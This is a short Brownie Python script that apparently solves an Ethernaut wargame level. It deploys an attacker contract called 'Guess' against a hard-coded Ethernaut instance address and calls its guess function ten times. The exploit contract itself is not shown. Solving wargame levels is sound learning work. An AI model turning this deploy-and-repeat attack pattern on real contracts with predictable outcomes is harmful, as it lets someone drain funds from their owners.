from brownie import accounts, Guess


def deploy():
    account = accounts.load("dev")
    ethernaut_instance_address = "0x2a3D7EbB7BB2F28F9C5BEFB7930b3b75c1bF7dad"
    guesser = Guess.deploy(ethernaut_instance_address, {"from": account})
    for i in range(10):
        guesser.guess()


def main():
    deploy()
